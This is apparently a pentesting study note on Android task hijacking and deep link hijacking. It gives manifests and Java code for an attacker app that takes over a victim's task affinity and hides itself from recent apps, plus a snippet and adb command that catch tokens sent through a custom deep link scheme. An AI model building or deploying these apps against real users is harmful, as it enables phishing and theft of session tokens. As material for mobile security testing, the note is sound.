# Content

# Task Hijacking / Task Affinity Attack
based on [singleTask mode](https://developer.android.com/guide/components/activities/tasks-and-back-stack#TaskLaunchModes) this gives 3 options for android os when an activity with this mode called :

- **If the Activity instance already exists:**
  - the system routes the intent to the existing instance through a call to its `onNewIntent()` method, rather than creating a new instance. Meanwhile all of the other activities on top of it are destroyed. 

- **If the Activity is newly created:**
  - The system creates the activity at the root of a new task
  - or locates the activity on an existing task with the same affinity

the affinity of an app is usually the package name, an attacker can exploit the last behavior to push the new created activity in the same stack of the hacker's activity

## Attack
### Victim App
notice the `android:launchMode="singleTask"`
```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.victim.app">

    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:logo="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/Theme.SuperSecureApp">
        <activity android:name=".LoggedIn"></activity>
        <activity android:name=".MainActivity" android:launchMode="singleTask">

            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
```


### Atacker App
- made the `taskAffinity` with the victim package name 
- `android:excludeFromRecents` ensures the task is not listed in the recent apps, to hide the attacker's app.
```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    package="com.hacker.app"
    tools:ignore="ExtraText">
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/Theme.AttackerApp"
        android:taskAffinity="com.victim.app">
        <activity android:name=".MainActivity" android:launchMode="singleTask" android:excludeFromRecents="true">

            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>

```

```java
package com.hacker.app;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        moveTaskToBack(true);
    }

    @Override
    public void onResume(){
        super.onResume();
        setContentView(R.layout.activity_main);
    }
}
```


### References
- https://blog.takemyhand.xyz/2021/02/android-task-hijacking-with.html
- https://book.hacktricks.xyz/mobile-pentesting/android-app-pentesting/android-task-hijacking
- https://blog.dixitaditya.com/android-task-hijacking?x-host=blog.dixitaditya.com

# Deep Links Hijacking 
the [deep link](https://developer.android.com/training/app-links/deep-linking) are URIs of any scheme that take users directly to a specific part of your app. 

the Android system tries each of the following actions, in sequential order, until the request succeeds:
- Open the user's preferred app that can handle the URI, if one is designated.
- Open the only available app that can handle the URI.
- Allow the user to select an app from a dialog.

if there a website using a deep link to send senstive data to it we can hijack this deeplink by creating an app using that listen to the same deeplink

## Attack
### Victim App
- AndroidMainfest
```xml
  <intent-filter>
    <action android:name="android.intent.action.VIEW"></action>
    <category android:name="android.intent.category.DEFAULT"></category>
    <category android:name="android.intent.category.BROWSABLE"></category>
    <data android:scheme="holiday" > </data>
</intent-filter>
```

### Atacker App
- java code
```java
setContentView(R.layout.activity_sniif); // Ensure the layout file name is correct
Intent intent = getIntent();
Uri uri = intent.getData();
TextView textView = findViewById(R.id.textViewHacked);
if (uri != null) {
  String uriString = uri.toString();
  textView.setText("hacked your account: "+uriString);
} else {
  textView.setText("No Uri data received");
}
```
- adb shell
```shell
am start -a android.intent.action.VIEW -d holiday://example.com?token=123456789
```

### look also for applinks and weblinks
